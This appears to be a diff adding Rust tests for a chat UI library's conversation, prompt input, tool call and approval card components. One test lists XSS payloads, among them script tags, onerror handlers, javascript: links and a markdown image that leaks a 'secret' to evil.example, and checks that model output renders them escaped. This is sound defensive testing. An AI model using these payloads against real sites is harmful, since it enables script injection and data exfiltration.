@@ -574,3 +574,144 @@ fn prop_types_round_trip() {
     let link = AppLink::check(&json!("/orders/1042"), "page", &mut checker).unwrap();
     assert_eq!(link.href().as_str(), "/orders/1042");
 }
+
+// ---------------------------------------------------------------------------
+// The conversation's parts
+// ---------------------------------------------------------------------------
+
+use navree_ui::genui::{
+    ApprovalCard, ChatLabels, ChatMessage, ChatState, Conversation, PromptInput, Suggestions,
+    ToolCallCard, ToolState, chat_notice,
+};
+use navree_ui::{LiveStream, render};
+
+/// A conversation in every state a page draws: the reader's words, a finished answer, a
+/// tool that ran, a notice and an answer still being written.
+fn conversation_html() -> String {
+    let labels = ChatLabels::default();
+    let stream = LiveStream::topics(["assistant.7"]);
+    render(
+        &Conversation::new("conversation", "/assistant/7/items")
+            .items([
+                ChatMessage::user("u1", "0001", "How did UPI do this week?").into_item(&labels),
+                ToolCallCard::new("t1", "0002", "Looked up payments")
+                    .state(ToolState::Done)
+                    .arguments(json!({ "period": "this_week" }))
+                    .into_item(&labels),
+                ChatMessage::assistant("a1", "0003", "UPI took **62%** of payments.")
+                    .into_item(&labels),
+                chat_notice("n1", "0004", "Refunded order CS-1042"),
+                ChatMessage::assistant("a2", "0005", "Looking at refunds")
+                    .state(ChatState::Writing)
+                    .stop("/assistant/7/stop", Some("tok".into()))
+                    .into_item(&labels),
+            ])
+            .since("12")
+            .live(stream.on("assistant.7"))
+            .into(),
+    )
+}
+
+#[test]
+fn a_conversation_is_a_live_list_that_starts_at_the_newest() {
+    // UI-GENUI-046
+    let html = conversation_html();
+    assert!(html.contains(r#"data-genui="conversation""#), "{html}");
+    assert!(html.contains(r#"data-ui-order="asc""#), "{html}");
+    assert!(html.contains(r#"data-ui-live-at="end""#), "{html}");
+    assert!(html.contains(r#"data-ui-live-event="assistant.7""#), "{html}");
+    assert!(html.contains(r#"data-ui-since="12""#), "{html}");
+    // Finished answers are read out once, politely; the one being written is quiet and
+    // listed under its writing key, so it is read out when it comes back finished.
+    assert!(html.contains(r#"data-l-new-one="The assistant answered""#), "{html}");
+    assert!(html.contains(r#"data-key="a2.w""#), "{html}");
+    assert!(
+        html.contains(r#"data-ui-say="The assistant answered: UPI took **62%** of payments.""#),
+        "{html}"
+    );
+    assert!(!html.contains(r#"role="log""#), "a log would read an answer out as it grows");
+    assert_eq!(html.matches(r#"aria-busy="true""#).count(), 1, "{html}");
+}
+
+#[test]
+fn every_part_works_with_no_script() {
+    // UI-GENUI-046: the parts are links and forms; the composer posts like any form.
+    let composer = render(
+        &PromptInput::new("composer", "/assistant/7/messages")
+            .csrf("tok")
+            .into(),
+    );
+    assert!(
+        composer.contains(r#"<form method="post" action="/assistant/7/messages""#),
+        "{composer}"
+    );
+    assert!(composer.contains(r#"type="submit""#), "{composer}");
+    let suggestions = render(
+        &Suggestions::new("/assistant/7/messages")
+            .csrf("tok")
+            .suggestion("How did UPI do this week?")
+            .into(),
+    );
+    assert!(
+        suggestions.contains(r#"name="message" value="How did UPI do this week?""#),
+        "{suggestions}"
+    );
+    let html = conversation_html();
+    assert!(html.contains(r#"<form method="post" action="/assistant/7/stop""#), "{html}");
+}
+
+#[test]
+fn hostile_words_from_a_model_stay_words() {
+    // UI-GENUI-046
+    let labels = ChatLabels::default();
+    for hostile in [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "[click](javascript:alert(1))",
+        "![leak](https://evil.example/?q=secret)",
+        "<form action=https://evil.example><button>Approve</button></form>",
+        "\"><svg onload=alert(1)>",
+    ] {
+        let html = render(&ChatMessage::assistant("a", "1", hostile).into_item(&labels).into());
+        let lower = html.to_ascii_lowercase();
+        assert!(!lower.contains("<script"), "{html}");
+        assert!(!lower.contains("<img"), "{html}");
+        assert!(!lower.contains("<form"), "{html}");
+        assert!(!lower.contains("<svg onload"), "{html}");
+        assert!(!lower.contains(r#"href="javascript"#), "{html}");
+        let tool = render(
+            &ToolCallCard::new("t", "1", hostile)
+                .arguments(json!({ "note": hostile }))
+                .into_item(&labels)
+                .into(),
+        );
+        assert!(!tool.to_ascii_lowercase().contains("<script"), "{tool}");
+        assert!(!tool.to_ascii_lowercase().contains("<img"), "{tool}");
+    }
+}
+
+#[test]
+fn an_approval_card_is_set_apart_and_names_what_it_approves() {
+    // UI-GENUI-045
+    let html = render(
+        &ApprovalCard::new(
+            "call_9",
+            "Refund an order",
+            json!({ "order": "CS-1042", "amount": 125000, "note": "<b>now</b>", "full": true }),
+        )
+        .routes("/assistant/7/approve", "/assistant/7/reject")
+        .csrf("tok")
+        .into(),
+    );
+    assert!(html.contains(r#"data-genui="approval""#), "{html}");
+    assert!(html.contains(r#"role="region""#), "{html}");
+    assert!(html.contains("The assistant asks to: Refund an order"), "{html}");
+    assert!(html.contains("<dt>order</dt><dd>CS-1042</dd>"), "{html}");
+    assert!(html.contains("<dt>full</dt><dd>yes</dd>"), "{html}");
+    assert!(html.contains("&lt;b&gt;now&lt;/b&gt;"), "{html}");
+    assert!(html.contains(r#"action="/assistant/7/approve""#), "{html}");
+    assert!(html.contains(r#"action="/assistant/7/reject""#), "{html}");
+    assert_eq!(html.matches(r#"name="call_id" value="call_9""#).count(), 2, "{html}");
+    assert_eq!(html.matches(r#"name="_csrf" value="tok""#).count(), 2, "{html}");
+    assert!(html.contains(r#"name="reason""#), "{html}");
+}
